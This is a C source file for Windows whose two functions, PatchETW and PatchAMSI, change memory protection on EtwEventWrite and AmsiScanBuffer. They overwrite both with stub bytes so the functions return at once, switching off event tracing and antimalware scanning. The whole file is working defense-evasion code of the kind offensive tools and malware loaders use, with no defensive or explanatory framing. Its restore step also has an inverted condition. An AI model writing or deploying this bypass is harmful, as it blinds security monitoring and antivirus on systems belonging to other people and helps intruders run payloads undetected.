#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "native.h"

#ifdef _WIN64
/*
	xor rax, rax
	ret
 */
unsigned char etw_patch[4] = { 0x48,0x33,0xc0,0xc3 };
unsigned char amsi_patch[4] = { 0x48,0x33,0xc0,0xc3 };
#else
/*
	xor eax, eax
	ret 0x14		; return with stack cleanup
 */
unsigned char etw_patch[5] = { 0x33,0xc0,0xc2,0x14,0x00 };
unsigned char amsi_patch[5] = { 0x33,0xc0,0xc2,0x14,0x00 };
#endif


BOOL PatchETW(FARPROC EtwEventWrite_addr) {
	DWORD dwOldProtection = 0;
	BOOL bProtectResult = VirtualProtect(EtwEventWrite_addr, (SIZE_T) sizeof(etw_patch) , PAGE_EXECUTE_READWRITE , &dwOldProtection);
	if (bProtectResult == 0) { printf("[x] Couldn't Change EtwEventWrite() memory Protection to RWX, err -> %d\n",GetLastError()); return FALSE; }
	
	printf("[+] Changed EtwEventWrite() memory Protection to RWX!\n");

	RtlMoveMemory(EtwEventWrite_addr, etw_patch,sizeof(etw_patch));

	printf("[+] Patch Success\n");

	BOOL bRetrieveProtect = 1;
	DWORD dwFinalProtection = 0;
	if (!dwOldProtection){
		bRetrieveProtect = VirtualProtect(EtwEventWrite_addr, (SIZE_T)sizeof(etw_patch), dwOldProtection, &dwFinalProtection); 
	}
	

	if (bRetrieveProtect == 0) { printf("[x] Couldn't Change Protection to RWX, err -> %d\n", GetLastError()); return FALSE; }
	
	printf("[+] Retrieved EtwEventWrite() memory Protection!\n");

	return TRUE;
}

BOOL PatchAMSI(FARPROC AmsiScanBuffer_addr){
	DWORD dwOldProtection = 0;
	BOOL bProtectResult = VirtualProtect(AmsiScanBuffer_addr, (SIZE_T)sizeof(etw_patch), PAGE_EXECUTE_READWRITE, &dwOldProtection);
	if (bProtectResult == 0) { printf("[x] Couldn't Change AmsiScanBuffer() memory Protection to RWX, err -> %d\n", GetLastError()); return FALSE; }

	printf("[+] Changed AmsiScanBuffer() memory Protection to RWX!\n");

	RtlMoveMemory(AmsiScanBuffer_addr, etw_patch, sizeof(etw_patch));

	printf("[+] Patch Success\n");

	BOOL bRetrieveProtect = 1;
	DWORD dwFinalProtection = 0;
	if (!dwOldProtection) {
		bRetrieveProtect = VirtualProtect(AmsiScanBuffer_addr, (SIZE_T)sizeof(etw_patch), dwOldProtection, &dwFinalProtection);
	}

	if (bRetrieveProtect == 0) { printf("[x] Couldn't Change Protection to RWX, err -> %d\n", GetLastError()); return FALSE; }

	printf("[+] Retrieved AmsiScanBuffer() memory Protection!\n");

	return TRUE;
}